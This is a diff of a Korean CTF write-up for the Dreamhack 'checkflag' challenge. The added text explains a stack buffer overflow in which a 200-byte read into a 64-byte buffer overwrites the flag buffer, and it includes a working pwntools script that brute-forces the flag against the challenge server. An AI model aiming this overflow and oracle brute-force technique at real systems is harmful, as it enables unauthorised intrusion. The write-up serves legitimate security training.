@@ -9,32 +9,85 @@ dreamhack checkflag
 만약 사용자 입력의 길이가 파일의 플래그 길이보다 짧거나 내용이 일치하지 않으면 "Failed!"를 출력하고 종료된다. 
 올바른 플래그를 입력하면 "Correct!"를 출력한다.
 
+프로그램 입력에서 발생할 수 있는 **버퍼 오버플로우** 를 이용하는 문제이다.
 
-1.  **변수 초기화:**
-    * `v10` (크기 64바이트)과 `v11` (크기 136바이트)은 스택에 할당된 문자 배열로, 각각 사용자 입력과 파일에서 읽은 플래그를 저장하는 데 사용됩니다.
-    * `v12`는 스택 카나리로 보이며, 스택 오버플로우 공격을 방지하는 데 사용됩니다.
-    * `v10` 배열의 내용은 0으로 초기화됩니다. 이는 `v3`가 50으로 설정되고 루프를 통해 4바이트씩 50번, 즉 200바이트를 0으로 설정하기 때문입니다. 다만 `v10`의 크기는 64바이트이므로, 이 초기화 루틴은 `v10`을 넘어 스택의 다른 부분까지 0으로 설정할 가능성이 있습니다.
+ * `read(0, v10, 0xC8uLL);`  를 보면 `v10` 버퍼의 크기는 **`char v10[64];`**로 선언되어 64바이트이다.
+ * `read` 함수는 `0xC8uLL` (십진수로 200) 바이트를 `v10`에 읽어오도록 지시하고 있다.
+ * 사용자가 64바이트보다 많은 데이터를 표준 입력(stdin)으로 주면 `read` 함수는 `v10` 버퍼의 할당된 공간(64바이트)을 초과하여 스택의 인접한 메모리 영역에 데이터를 덮어쓰게 된다.
 
-2.  **플래그 파일 읽기:**
-    * 프로그램은 현재 디렉터리에서 `flag`라는 이름의 파일을 **읽기 모드(`"r"`)**로 엽니다.
-    * 파일을 여는 데 실패하면 (예: 파일이 없거나 권한 문제), 프로그램은 오류 메시지 없이 `exit(1)`을 호출하여 종료됩니다.
-    * 파일이 성공적으로 열리면, `fgets` 함수를 사용하여 파일 내용의 **최대 63바이트**(널 종료 문자를 포함하여 64바이트)를 `v11` 버퍼로 읽어옵니다.
-    * 파일을 읽은 후에는 `fclose(v6)`를 호출하여 파일을 닫습니다.
 
-3.  **사용자 입력 요청:**
-    * `fputs("What's the flag? ", _bss_start);`를 통해 사용자에게 "What's the flag? "라는 프롬프트를 출력합니다. `_bss_start`는 표준 출력(`stdout`)과 같은 스트림을 가리킬 가능성이 높습니다.
-    * `fflush(_bss_start);`를 통해 출력 버퍼를 비워 프롬프트가 즉시 화면에 표시되도록 합니다.
+<img width="497" height="151" alt="image" src="https://github.com/user-attachments/assets/8be3e26c-8f69-4bba-a0b1-d3eaab6be36e" />
 
-4.  **사용자 입력 받기:**
-    * `read(0, v10, 0xC8uLL);`를 호출하여 표준 입력(파일 디스크립터 0)에서 **최대 200바이트(`0xC8uLL`)**를 `v10` 버퍼로 읽어옵니다.
-    * `v7` 변수는 실제로 읽은 바이트 수를 저장합니다.
+* 여기서 입력값과 정답을 비교할때 strcmp()는 첫 번째 널문자('\0') 전까지 비교한다.
+* 그런데 만약 **input에 널 문자('\0')를 65개 연속으로 입력하면** 메모리 오버플로우로 인해
+  flag 버퍼의 첫 글자도 \0으로 덮인다.
+* 즉 input도 "", flag도 "" → strcmp는 이 둘을 **같다** 고 인식하게 된다.
 
-5.  **플래그 비교:**
-    * 두 가지 조건으로 플래그를 비교하여 사용자가 올바른 플래그를 입력했는지 확인합니다:
-        * `(__int64)strlen(v11) > v7`: `flag` 파일에서 읽은 플래그(`v11`)의 길이(널 종료 문자 제외)가 사용자 입력(`v10`)의 길이(`v7`)보다 **긴지** 확인합니다. 만약 파일 플래그가 더 길다면, 사용자 입력이 불완전하다고 판단하여 실패로 처리됩니다.
-        * `strcmp(v10, v11)`: `v10` (사용자 입력)과 `v11` (파일 플래그)의 문자열을 비교합니다. 두 문자열이 **다르면** `strcmp`는 0이 아닌 값을 반환하여 실패로 처리됩니다.
 
-6.  **결과 출력:**
-    * 위 두 조건 중 하나라도 참이면 (즉, 플래그가 일치하지 않거나 사용자 입력이 너무 짧으면) `Failed!\n`를 출력하고 `exit(1)`을 호출하여 프로그램이 종료됩니다.
-    * 두 조건 모두 거짓이면 (즉, 플래그가 일치하고 사용자 입력 길이가 충분하면) `Correct!\n`를 출력하고 프로그램은 정상적으로 `return 0;`으로 종료됩니다.
+그러면 브루트포싱을 사용해 플래그를 알아낼 수 있는데
+
+* flag 일부를 덮어쓰기 위해 입력 길이를 flag까지 넘치게 만들고
+* 문자열 비교 결과가 "Correct!"인지 확인해서
+* 한 글자씩 줄여가며 이 과정을 반복하며 플래그를 거꾸로 한 글자씩 알아낼 수 있다.
+
+
+### 익스플로잇 코드
+
+
+```python
+from pwn import *
+
+flag_len = 0
+for length in range(0x3f, 0, -1):
+    test_payload = b'A' * length
+    payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + test_payload
+
+    p = remote('host3.dreamhack.games', 14991)
+    p.sendafter(b'flag?', payload)
+
+    if ord('F') in p.recvuntil(b'!\n'):
+        flag_len = length + 1
+        p.close()
+        break
+    p.close()
+
+found_flag = b''
+for i in range(flag_len - 4):
+    for c in range(0x20, 0x7f):
+        test_payload = b'A' * (flag_len - 2 - i) + chr(c).encode() + found_flag + b'}'
+        payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + b'A' * (flag_len - 2 - i)
+
+        p = remote('host3.dreamhack.games', 14991)
+        p.sendafter(b'flag?', payload)
+
+        if ord('C') in p.recvuntil(b'!\n'):
+            found_flag = chr(c).encode() + found_flag
+            p.close()
+            break
+        p.close()
+
+print('DH{' + found_flag.decode() + '}')
+```
+
+```python
+for length in range(0x3f, 0, -1):  # 0x3f = 63부터 1까지 감소
+```
+
+길이 63부터 1까지 시도하며 맞는 길이를 찾는다.
+
+```python
+test_payload = b'A' * length
+payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + test_payload
+```
+
+payload 구조:
+  * 입력부: A * length
+  * 패딩: null (\x00)로 64바이트 채움
+  * 검증부: A * length 재사용
+    → 총 64바이트 입력 후 동일한 패턴을 뒤에 붙임.
+
+
+
+
+<img width="432" height="57" alt="image" src="https://github.com/user-attachments/assets/ae355a17-496b-4c0b-838a-e2843ca2ded6" />
 
